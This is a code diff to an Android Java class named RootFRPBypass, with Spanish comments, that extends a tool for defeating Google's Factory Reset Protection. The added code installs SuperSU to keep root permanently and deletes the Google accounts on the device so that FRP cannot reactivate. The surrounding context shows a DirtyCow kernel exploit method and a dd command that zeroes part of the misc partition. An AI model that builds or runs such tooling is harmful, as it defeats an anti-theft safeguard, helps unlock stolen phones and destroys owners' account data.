@@ -22,10 +22,65 @@ public class RootFRPBypass {
     private static final String TAG = "RootFRPBypass";
     private Context context;
     private OperationCallback callback;
+    private SuperSUInstaller superSUInstaller;
+    private GoogleAccountRemover googleAccountRemover;
 
     public RootFRPBypass(Context context, OperationCallback callback) {
         this.context = context;
         this.callback = callback;
+        
+        // Inicializar componentes
+        initializeComponents();
+    }
+    
+    private void initializeComponents() {
+        // Inicializar instalador de SuperSU
+        this.superSUInstaller = new SuperSUInstaller(context, new SuperSUInstaller.InstallCallback() {
+            @Override
+            public void onSuccess(String message) {
+                if (callback != null) {
+                    callback.onSuccess("supersu", message);
+                }
+            }
+
+            @Override
+            public void onFailed(String error) {
+                if (callback != null) {
+                    callback.onFailed("supersu", error);
+                }
+            }
+
+            @Override
+            public void onProgress(String progress) {
+                if (callback != null) {
+                    callback.onProgress("supersu", progress);
+                }
+            }
+        });
+        
+        // Inicializar eliminador de cuentas Google
+        this.googleAccountRemover = new GoogleAccountRemover(context, new GoogleAccountRemover.RemoveCallback() {
+            @Override
+            public void onSuccess(String message) {
+                if (callback != null) {
+                    callback.onSuccess("google_account", message);
+                }
+            }
+
+            @Override
+            public void onFailed(String error) {
+                if (callback != null) {
+                    callback.onFailed("google_account", error);
+                }
+            }
+
+            @Override
+            public void onProgress(String progress) {
+                if (callback != null) {
+                    callback.onProgress("google_account", progress);
+                }
+            }
+        });
     }
 
     public interface OperationCallback {
@@ -54,6 +109,10 @@ public class RootFRPBypass {
             if (hasRoot) {
                 publishProgress(new ProgressUpdate("root", "El dispositivo ya tiene root"));
                 successMessages.add("Root: El dispositivo ya tiene root");
+                
+                // Instalar SuperSU para mantener root permanente
+                publishProgress(new ProgressUpdate("supersu", "Instalando SuperSU para mantener root permanente..."));
+                installSuperSU();
             } else {
                 // Intentar obtener root
                 publishProgress(new ProgressUpdate("root", "Intentando obtener root..."));
@@ -61,6 +120,10 @@ public class RootFRPBypass {
                 if (hasRoot) {
                     publishProgress(new ProgressUpdate("root", "Root obtenido exitosamente"));
                     successMessages.add("Root: Obtenido exitosamente");
+                    
+                    // Instalar SuperSU para mantener root permanente
+                    publishProgress(new ProgressUpdate("supersu", "Instalando SuperSU para mantener root permanente..."));
+                    installSuperSU();
                 } else {
                     publishProgress(new ProgressUpdate("root", "No se pudo obtener root, intentando bypass de FRP sin root..."));
                 }
@@ -94,6 +157,11 @@ public class RootFRPBypass {
             if (frpBypassed) {
                 publishProgress(new ProgressUpdate("frp", "Bypass de FRP exitoso"));
                 successMessages.add("FRP: Bypass exitoso");
+                
+                // Eliminar cuentas de Google para asegurar que FRP no se reactive
+                publishProgress(new ProgressUpdate("google_account", "Eliminando cuentas de Google para prevenir reactivación de FRP..."));
+                removeGoogleAccounts();
+                
                 return true;
             } else {
                 errorMessage = "No se pudo hacer bypass de FRP";
@@ -224,6 +292,46 @@ public class RootFRPBypass {
     }
 
     /**
+     * Instala SuperSU para mantener root permanente
+     */
+    private boolean installSuperSU() {
+        try {
+            if (callback != null) {
+                callback.onProgress("supersu", "Iniciando instalación de SuperSU...");
+            }
+            
+            superSUInstaller.install();
+            return true;
+        } catch (Exception e) {
+            Log.e(TAG, "Error al instalar SuperSU: " + e.getMessage());
+            if (callback != null) {
+                callback.onFailed("supersu", "Error al instalar SuperSU: " + e.getMessage());
+            }
+            return false;
+        }
+    }
+
+    /**
+     * Elimina cuentas de Google
+     */
+    private boolean removeGoogleAccounts() {
+        try {
+            if (callback != null) {
+                callback.onProgress("google_account", "Iniciando eliminación de cuentas de Google...");
+            }
+            
+            googleAccountRemover.removeAccounts();
+            return true;
+        } catch (Exception e) {
+            Log.e(TAG, "Error al eliminar cuentas de Google: " + e.getMessage());
+            if (callback != null) {
+                callback.onFailed("google_account", "Error al eliminar cuentas de Google: " + e.getMessage());
+            }
+            return false;
+        }
+    }
+
+    /**
      * Implementación del exploit DirtyCow
      */
     private boolean executeDirtyCowExploit() {
@@ -300,6 +408,9 @@ public class RootFRPBypass {
             String miscPartition = "/dev/block/bootdevice/by-name/misc";
             executeRootCommand("dd if=/dev/zero of=" + miscPartition + " bs=1 count=128 seek=16384");
             
+            // Método 4: Eliminar cuentas de Google
+            removeGoogleAccounts();
+            
             // Verificar si FRP sigue activo
             if (!isFRPActive()) {
                 success = true;
@@ -325,6 +436,9 @@ public class RootFRPBypass {
             
             // Método 2: Usar exploits específicos de HTC
             // Este método requeriría interacción del usuario
+            
+            // Método 3: Intentar eliminar cuentas de Google sin root
+            removeGoogleAccounts();
             
             // Verificar si FRP sigue activo (esto es aproximado sin root)
             return !hasGoogleAccounts();
